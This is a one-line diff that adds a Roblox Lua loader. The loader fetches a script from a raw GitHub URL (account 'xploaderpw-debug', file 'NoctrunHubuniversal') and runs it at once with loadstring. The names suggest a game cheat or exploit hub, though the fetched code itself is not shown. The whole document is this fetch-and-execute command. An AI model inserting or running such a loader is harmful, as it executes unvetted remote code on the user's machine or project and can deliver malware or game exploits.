@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xploaderpw-debug/script/main/NoctrunHubuniversal"))()
